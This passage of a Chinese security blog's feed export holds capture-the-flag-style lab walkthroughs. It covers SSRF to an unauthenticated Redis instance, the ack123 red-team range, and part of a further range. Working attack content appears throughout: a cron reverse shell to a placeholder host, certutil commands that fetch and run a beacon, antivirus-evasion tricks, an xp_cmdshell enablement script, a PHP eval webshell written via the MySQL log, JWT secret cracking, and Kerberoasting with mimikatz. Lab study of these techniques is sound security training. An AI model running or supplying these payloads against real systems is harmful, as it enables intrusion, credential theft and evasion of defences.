href="#27-Redis未授权" class="headerlink" title="27 Redis未授权"></a>27 Redis未授权</h2><p>内网的 172.72.23.27 主机上的 6379 端口运行着未授权的 Redis 服务，系统没有 Web 服务（无法写 Shell），无 SSH 公私钥认证（无法写公钥），所以这里攻击思路只能是使用定时任务来进行攻击了。常规的攻击思路的主要命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 清空 key</span></span><br><span class="line">flushall</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置要操作的路径为定时任务目录</span></span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /var/spool/cron/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置定时任务角色为 root</span></span><br><span class="line">config <span class="built_in">set</span> dbfilename root</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置定时任务内容</span></span><br><span class="line"><span class="built_in">set</span> x <span class="string">&quot;\n* * * * * /bin/bash -i &gt;&amp; /dev/tcp/x.x.x.x/2333 0&gt;&amp;1\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存操作</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>命令格式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dict://ip:port/redis命令</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211071847051.png"></p><p>写计划任务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 清空 key</span></span><br><span class="line">dict://172.72.23.27:6379/flushall</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置要操作的路径为定时任务目录</span></span><br><span class="line">dict://172.72.23.27:6379/config <span class="built_in">set</span> <span class="built_in">dir</span> /var/spool/cron/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在定时任务目录下创建 root 的定时任务文件</span></span><br><span class="line">dict://172.72.23.27:6379/config <span class="built_in">set</span> dbfilename root</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入 Bash 反弹 shell 的 payload</span></span><br><span class="line">dict://172.72.23.27:6379/set x <span class="string">&quot;\n* * * * * /bin/bash -i &gt;%26 /dev/tcp/x.x.x.x/2333 0&gt;%261\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 保存上述操作</span></span><br><span class="line">dict://172.72.23.27:6379/save</span><br></pre></td></tr></table></figure><p>接受到shell</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202211071852905.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;看到国光师傅的文章，复现一遍，靶场搭建来自 &lt;a href=&quot;https://github.com/Duoduo-chino/ssrf_vul&quot;&gt;https://github.com/Duoduo-chino/ssrf_vul&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202211041403610.png&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;靶场搭建&quot;&gt;&lt;a href=&quot;#靶场搭建&quot; class=&quot;headerlink&quot; title=&quot;靶场搭建&quot;&gt;&lt;/a&gt;靶场搭建&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202211041415547.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="redis" scheme="https://syst1m.top/tags/redis/"/>
    
    <category term="ssrf" scheme="https://syst1m.top/tags/ssrf/"/>
    
  </entry>
  
  <entry>
    <title>暗月ack123靶场打靶</title>
    <link href="https://syst1m.top/2022/09/28/%E6%9A%97%E6%9C%88ack123%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6/"/>
    <id>https://syst1m.top/2022/09/28/%E6%9A%97%E6%9C%88ack123%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6/</id>
    <published>2022-09-28T07:56:37.000Z</published>
    <updated>2022-10-21T06:07:53.439Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>此靶场是月师傅九月出师考核靶场，搭建过程参考文章<a href="https://mp.weixin.qq.com/s/VB4elHdrHNCmPDP_ktcLRg">红队考核靶场ack123下载和搭建</a></p><p>靶场地址：<a href="https://pan.baidu.com/s/13g_1FFg-ZYYpBwkCvKyYWQ">https://pan.baidu.com/s/13g_1FFg-ZYYpBwkCvKyYWQ</a> 提取码：7fkj</p><h2 id="拓补图"><a href="#拓补图" class="headerlink" title="拓补图"></a>拓补图</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209281557342.png"></p><h2 id="考察点"><a href="#考察点" class="headerlink" title="考察点"></a>考察点</h2><p>1.站库分离 外网打点</p><p>2.过360全家桶</p><p>3.过windwos defender</p><p>4.过火绒</p><p>5.内网漫游</p><p>6.多层网络渗透</p><p>7.横向渗透</p><p>8.jwt token密钥破解</p><p>9.权限提升</p><p>10.域渗透</p><p>11.phpmyadmin写shell</p><p>12.sqlserver 提权</p><h1 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h1><p>这里本来要使用frp内网穿透出去，但是太慢了也不太稳定，索性直接添加一张网卡，桥接模式复制物理地址</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>访问首页，发现cms信息</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210011643555.png"></p><p>对靶机进一步扫描</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210011647992.png"></p><p>扫出后台地址</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210011653183.png"></p><p>手动尝试几个密码无果</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210011654204.png"></p><p>注册一个账号看看，得到服务器信息，和编辑器版本</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210011656152.png"></p><h2 id="UEditor-1-4-3-任意文件上传getshell"><a href="#UEditor-1-4-3-任意文件上传getshell" class="headerlink" title="UEditor 1.4.3 任意文件上传getshell"></a>UEditor 1.4.3 任意文件上传getshell</h2><p>google到此编辑器版本存在任意上传 <a href="https://www.cnblogs.com/sup3rman/p/13071382.html">UEditor 1.4.3 任意文件上传getshell</a></p><p>制作上传html的文件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://www.ackmoon.com/admin/net/controller.ashx?action=catchimage&quot;</span><span class="attr">enctype</span>=<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>  <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">shell addr: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;source[]&quot;</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>再生成一个图片马到本地（不要改成aspx后缀），通过CententType来校验文件是否为图片，再根据文件名最后的后缀作为后缀</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210011814372.png"></p><p>利用python在马子的目录起一个http服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure><p><code>此处有大坑，不要把图片马的名字改为xx.png?.aspx!!</code>,因为这里如果改成了这个名字，?会被url编码成ma.png%3F.aspx,就会被过滤</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210011845376.png"></p><p>但是不经过url编码，直接修改为ma.png?.aspx,会报错404</p><p>应该就在输入框中加入后缀?.aspx</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210011838028.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210011839118.png"></p><p>冰蝎连接</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210011857708.png"></p><h1 id="内网打点"><a href="#内网打点" class="headerlink" title="内网打点"></a>内网打点</h1><h2 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2><p>存在360</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210011900570.png"></p><p>存在多个网段</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210011901885.png"></p><p>上线到msf提权，也可以上线到cs</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210011912448.png"></p><p>提权到system</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210011912454.png"></p><h2 id="站库分离打点"><a href="#站库分离打点" class="headerlink" title="站库分离打点"></a>站库分离打点</h2><p>这里上线到cs使用Erebus插件里的烂土豆提权到system</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210012024620.png"></p><p>查看进程和服务，发现存在mysql，但是并没有sqlserver，由上面我们得到的信息，这个web服务器的数据库应该是sqlserver，那么应该是站库分离</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210021525041.png"></p><p>对内网存活主机进行端口扫描，发现sqlserver</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210012058674.png"></p><p>猜测22网段的存活主机，就是这台web服务器的数据库，翻翻配置文件，找到sqlserver账号密码</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210021530350.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210021530400.png"></p><p>msf添加隧道</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210021534613.png"></p><p>再起一个代理,方便给其他工具使用</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210021536538.png"></p><p>使用msf自带的模块执行xp_cmdshell,成功执行命令</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210021538700.png"></p><p>使用无文件落地上线到cs上发现一直没反应，应该是调用pwershell被杀软拦截了,再使用certutil远程下载也被火绒拦截</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -<span class="built_in">split</span> -f http://192.168.31.118/beacon.exe C:\Windows\Temp\test.exe</span><br></pre></td></tr></table></figure><p>重新Nacicat permium新建一个连接，要用Proxifier走一下kali起的代理</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210021714979.png"></p><p>xp_cmdshell默认关闭的，需要手动开启</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#启用xp_cmdshell</span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>,<span class="number">1</span>;</span><br><span class="line">RECONFIGURE;</span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>,<span class="number">1</span>;</span><br><span class="line">RECONFIGURE;</span><br><span class="line"></span><br><span class="line">#关闭xp_cmdshell</span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>,<span class="number">1</span>;</span><br><span class="line">RECONFIGURE;</span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>,<span class="number">0</span>;</span><br><span class="line">RECONFIGURE;</span><br><span class="line"></span><br><span class="line">#恢复<span class="operator">/</span>删除xp_cmdshell</span><br><span class="line"><span class="keyword">EXEC</span> sp_addextendedproc xp_cmdshell,<span class="variable">@dllname</span><span class="operator">=</span><span class="string">&#x27;xplog70.dll&#x27;</span>;</span><br><span class="line"><span class="keyword">EXEC</span> sp_dropextendedproc <span class="string">&#x27;xplog70.dll&#x27;</span>;</span><br></pre></td></tr></table></figure><p>执行命令</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> master..xp_cmdshell <span class="string">&#x27;whoami&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210021722115.png"></p><p>发现杀软，这个命令在kali上执行是报错的可能是回显太长了？</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210021724777.png"></p><p>cs直接生成无文件落地，调用pwershell或者直接使用certutil去下载远程后门，都会被火绒拦截</p><p>解决办法来自这篇文章 <a href="https://xz.aliyun.com/t/9265">记一次利用mssql上线</a>，这里我直接使用工具MDUT上的com组件方便一点，也需要走代理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy C:\Windows\System32\certutil.exe  C:\windows\temp\sethc.exe</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081509650.png"></p><p>生成免杀shell放到kali上，再用python起一个http服务，用刚刚复制的certutil.exe来下载</p><p><a href="https://github.com/yqcs/ZheTian">免杀项目</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Temp\sethc.exe -urlcache -<span class="built_in">split</span> -f <span class="string">&quot;http://192.168.31.54/pMJYrMDKRj.exe&quot;</span> C:\Windows\Temp\loader.exe</span><br></pre></td></tr></table></figure><p>运行后门，上线</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Temp\loader.exe</span><br></pre></td></tr></table></figure><p>成功bypass火绒上线</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081520743.png"></p><p>粘贴systeminfo信息到在线提权辅助工具，拿到提权可用信息，有的不准自己判断，最后还是试用Erebus插件里的烂土豆提权到system</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081527002.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081530429.png"></p><p>注入进程到一个x64进程上稳定一下后门，到此已经拿下2台主机，web服务器和数据库服务器，继续横向，继续信息收集</p><h2 id="phpmyadmin-getshell"><a href="#phpmyadmin-getshell" class="headerlink" title="phpmyadmin getshell"></a>phpmyadmin getshell</h2><p>发现存活另一台存活主机（前面没开）</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081639515.png"></p><p>存在80端口，用最开始msf起的socks5代理浏览器访问</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081639116.png"></p><p>登录抓个包，发现熟悉的jwt格式密文</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081643466.png"></p><p>加密需要秘钥</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081711696.png"></p><p>用工具来跑</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/ticarpi/jwt_tool.git</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> jwt_tool</span><br><span class="line"></span><br><span class="line">python3 -m pip install -r requirements.txt</span><br><span class="line"></span><br><span class="line">python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC8xMC4xMC4xLjEzNSIsImF1ZCI6Imh0dHA6XC9cLzEwLjEwLjEuMTM1IiwiaWF0IjoxNjQyMTY0MDA2LCJuYmYiOjE2NDIxNjQwMTYsImV4cCI6MTY0MjE2NDYwNiwiZGF0YSI6eyJ1c2VyaWQiOjEsInVzZXJuYW1lIjoiZGVtbyJ9fQ.mgbBNSJL1MTGep8eJTqfvH-1Zf6F82_Lvp19eGlr0DA -C -d /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><p>跑出秘钥 Qweasdzxc5</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081726972.png"></p><p>看了公开wp才知道考点在这个响应头，可以google到phpstudy版本，从而得到phpmyadmin路径 url&#x2F;phpmyadmin4.8.5（感觉很无厘头。。）</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081733978.png"></p><p>root&#x2F;Qweasdzxc5 登录成功</p><p>phpmyadmin 日志包含写马</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#查询是否开启日志功能</span><br><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%general%&#x27;</span> </span><br><span class="line">#开启日志并修改保存路径</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log<span class="operator">=</span><span class="string">&#x27;on&#x27;</span>;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file<span class="operator">=</span><span class="string">&#x27;C:\\phpstudy_pro\\WWW\\shell.php&#x27;</span>;</span><br><span class="line">#写入shell</span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php @eval($_POST[&quot;a&quot;]); ?&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>蚁剑走代理连接</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081800493.png"></p><p>上线到cs，这台靶机是不出网的，所以上线就要用到转发上线</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081811400.png"></p><p>成功上线cs，提权到system</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081812473.png"></p><h1 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h1><h2 id="信息收集-2"><a href="#信息收集-2" class="headerlink" title="信息收集"></a>信息收集</h2><p>发现存在域ack123.com，而且存在两张网卡,域控ip 10.10.10.135</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081814882.png"></p><p>域控、域管理员</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081855883.png"></p><h2 id="kerberost攻击域控"><a href="#kerberost攻击域控" class="headerlink" title="kerberost攻击域控"></a>kerberost攻击域控</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Kerberoast攻击共分为五步</span><br><span class="line"><span class="bullet">1.</span>  SPN发现</span><br><span class="line"><span class="bullet">2.</span>  请求服务票据</span><br><span class="line"><span class="bullet">3.</span>  导出服务票据</span><br><span class="line"><span class="bullet">4.</span>  破解服务服务票据</span><br><span class="line"><span class="bullet">5.</span>  重写服务票据</span><br></pre></td></tr></table></figure><p>查询spn服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell setspn -T ack123.com -q */*</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081854824.png"></p><p>创建票据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::ask /target:mysql/16server-dc1.ack123.com</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081905241.png"></p><p>列出票据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::list</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081913306.png"></p><p>切到temp目录导出票据</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081912569.png"></p><p>下载下来</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081912705.png"></p><p>使用工具爆破密码<a href="https://github.com/nidem/kerberoast">https://github.com/nidem/kerberoast</a> </p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081919411.png"></p><p>根据拿到的密码和前面查询到的域管账号进行hash传递</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081922956.png"></p><p>成功上线dc</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081923356.png"></p><p>在用dc1的域管去横向136那台主机，完事！</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202210081928171.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h1&gt;&lt;p&gt;此靶场是月师傅九月出师考核靶场，搭建过程参考文章&lt;a href=&quot;https://mp.weixin.qq.com/s/VB4elHdrHNCmPDP_ktcLRg&quot;&gt;红队考核靶场ack123下载和搭建&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;靶场地址：&lt;a href=&quot;https://pan.baidu.com/s/13g_1FFg-ZYYpBwkCvKyYWQ&quot;&gt;https://pan.baidu.com/s/13g_1FFg-ZYYpBwkCvKyYWQ&lt;/a&gt; 提取码：7fkj&lt;/p&gt;
&lt;h2 id=&quot;拓补图&quot;&gt;&lt;a href=&quot;#拓补图&quot; class=&quot;headerlink&quot; title=&quot;拓补图&quot;&gt;&lt;/a&gt;拓补图&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/chencicici/images/main/202209281557342.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="打靶" scheme="https://syst1m.top/categories/%E6%89%93%E9%9D%B6/"/>
    
    
    <category term="ATT&amp;CK" scheme="https://syst1m.top/tags/ATT-CK/"/>
    
    <category term="内网渗透" scheme="https://syst1m.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="免杀" scheme="https://syst1m.top/tags/%E5%85%8D%E6%9D%80/"/>
    
    <category term="过狗" scheme="https://syst1m.top/tags/%E8%BF%87%E7%8B%97/"/>
    
  </entry>
  
  <entry>
    <title>暗月渗透实战靶场项目七</title>
    <link href="https://syst1m.top/2022/09/14/%E6%9A%97%E6%9C%88%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E9%A1%B9%E7%9B%AE%E4%B8%83/"/>
    <id>https://syst1m.top/2022/09/14/%E6%9A%97%E6%9C%88%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA%E9%A1%B9%E7%9B%AE%E4%B8%83/</id>
    <published>2022-09-14T14:59:49.000Z</published>
    <updated>2022-09-15T16:10:34.301Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>使用的是暗月提供的环境，直接打开虚拟机运行</p><h2 id="网络环境"><a href="#网络环境" class="headerlink" title="网络环境"></a>网络环境</h2><p>添加两张网卡，web的第一张网卡为桥接模式，需要进入系统修改为自动获取ip</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151041618.png"></p><h2 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h2><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151043483.png"></p><p>因为防火墙设置，内网是禁ping的，验证方式访问80端口能正常打开就行</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>使用nmap确认靶机ip</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151107978.png"></p><p>详细扫描</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151125059.png"></p><p>999端口为phpmyadmin，6588为护卫神前台面板</p><p>根据提示，添加一条dns解析</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151131184.png"></p><p>成功访问到</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151132005.png"></p><h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><p>发现存在安全狗</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151134080.png"></p><p>识别一下</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151134241.png"></p><p>存在安全狗的话，扫描速度就要降低，也要降低线程数</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151251191.png"></p><p>最后扫到一个robots.txt</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151259214.png"></p><p>siteserver后台泄露</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151300450.png"></p><h1 id="web打点"><a href="#web打点" class="headerlink" title="web打点"></a>web打点</h1><h2 id="禁用js找回密码"><a href="#禁用js找回密码" class="headerlink" title="禁用js找回密码"></a>禁用js找回密码</h2><p>通过禁用js，来找回管理员密码</p><p>点击忘记密码输入admin，然后禁用js，点下一步，这里使用的是google的插件Quick Javascript Switcher</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151431725.png"></p><p>之后什么都不用填点下一步，出来密码</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151428997.png"></p><p>成功登录后台</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151434449.png"></p><h2 id="后台getshell"><a href="#后台getshell" class="headerlink" title="后台getshell"></a>后台getshell</h2><p>在’系统管理’，’站点模版管理’，’导入站点模版’，把我们的过狗aspx的一句话压缩为zip上传到目标模版</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151504537.png"></p><p>这里上传需要注意，我这里直接用冰蝎的免杀shell，其次名字不能为shell.asp这种会被安全狗识别</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151504384.png"></p><p>冰蝎连接 <a href="http://www.moonlab.com/SiteFiles/SiteTemplates/aa/aa.aspx">http://www.moonlab.com/SiteFiles/SiteTemplates/aa/aa.aspx</a>  rebeyond</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151504119.png"></p><p>拿下web主机</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151506900.png"></p><h2 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2><p>发现还有一个网段</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151510640.png"></p><p>进程中发现有安全狗</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151512435.png"></p><p>服务中发现存在防火墙和defender</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151514183.png"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>用冰蝎自带的shell转发到msf</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151519635.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151519560.png"></p><p>使用getsystem提权到system</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151520021.png"></p><p>拿到的是一个32位的权限，迁移进程至64系统进程维持权限</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151650939.png"></p><h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><h2 id="搭建代理隧道"><a href="#搭建代理隧道" class="headerlink" title="搭建代理隧道"></a>搭建代理隧道</h2><p>添加路由</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151522436.png"></p><p>添加socks隧道</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151523345.png"></p><p>proxychains添加一条代理</p><p>socks5 127.0.0.1 1080</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151527087.png"></p><p>测试连通性</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151527249.png"></p><p>也可以上线到cs</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151625201.png"></p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151629920.png"></p><h2 id="上线cs"><a href="#上线cs" class="headerlink" title="上线cs"></a>上线cs</h2><p>发现由冰蝎上线的cs会掉线，所以用system权限的msf上传一个后门，但是没免杀会被windefend杀掉，命令关不掉windefend，只能抓hash然后打开远程桌面上去手动关掉</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202209151724755.png"></p><p><img 